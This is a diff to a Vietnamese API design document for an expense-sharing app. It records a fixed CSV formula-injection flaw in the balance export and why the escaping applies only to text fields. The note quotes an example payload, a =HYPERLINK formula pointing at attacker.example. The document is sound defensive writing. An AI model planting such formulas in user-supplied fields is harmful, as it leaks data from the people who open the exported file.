@@ -609,6 +609,23 @@ GET    /groups/{id}/export/balances.csv      Xuất CSV số dư từng người
 
 Ảnh lưu trong bảng `ReceiptImage` (SQL Server, `varbinary(max)`) — không dùng local disk hay cloud storage. `GET` bắt buộc `[Authorize]` + kiểm tra thành viên nhóm (khác với việc phục vụ file tĩnh qua static files, vốn không kiểm tra quyền — đã cân nhắc và chọn cách này để tránh lộ ảnh hóa đơn tài chính cho người ngoài group).
 
+> ⚠️ **Lỗ hổng bảo mật phát hiện + sửa qua `security-review` (2026-09-07):** `CsvBuilder.Escape`
+> (dùng bởi 2 endpoint export CSV ở trên) trước đây chỉ escape đúng chuẩn RFC 4180 (dấu
+> phẩy/ngoặc kép/xuống dòng), không phòng CSV/Formula Injection (CWE-1236). `Expense.Title`,
+> `Expense.Note`, `GroupMember.DisplayName` đều là text tự do người dùng đặt, không giới hạn ký tự —
+> một thành viên ác ý có thể đặt tên/tiêu đề dạng `=HYPERLINK("http://attacker.example/...",...)`; khi
+> người khác (thường là Owner) mở file CSV xuất ra bằng Excel/LibreOffice/Sheets, ô bắt đầu bằng
+> `=`/`+`/`-`/`@` bị hiểu là công thức và tự chạy (rò rỉ dữ liệu ô khác, hoặc DDE trên Excel cũ). Đã
+> sửa: `CsvBuilder.Escape` thêm dấu nháy đơn (`'`) trước ký tự kích hoạt công thức đầu tiên — nhưng
+> **CHỈ áp dụng cho field kiểu `string`**, không áp cho field số (`TotalAmount`, `ExtraFeeAmount`,
+> `Net`...). Lý do quan trọng: lần sửa đầu tiên áp luật này cho MỌI field kể cả số, khiến một số dư âm
+> hợp lệ như `-50000` (hoàn toàn do server tự format từ `long`, không phải input tự do) bị biến thành
+> chuỗi `"'-50000"` — phá hỏng khả năng tính tổng/so sánh trong Excel, tức là phá luôn công dụng chính
+> của việc xuất CSV số dư, mà không tăng thêm an toàn thực sự (số không thể chứa công thức). Phát hiện
+> bug hồi quy này ngay khi chạy lại `dotnet test` sau lần sửa đầu — nhắc nhở: biện pháp chống CSV
+> injection kiểu "thêm `'` cho mọi field bắt đầu bằng `=+-@`" là cạm bẫy phổ biến, phải phân biệt field
+> text tự do với field số/enum do server tự sinh. Test: `CsvBuilderTests` (UnitTests).
+
 `PUT /expenses/{expenseId}` và các endpoint ghi vào `Settlement` yêu cầu client gửi kèm `rowVersion` (base64) lấy từ lần đọc gần nhất; server so khớp trước khi ghi, lệch thì trả `409 CONCURRENCY_CONFLICT` (xem 4.3/4.4).
 
 `POST /expenses` request body:
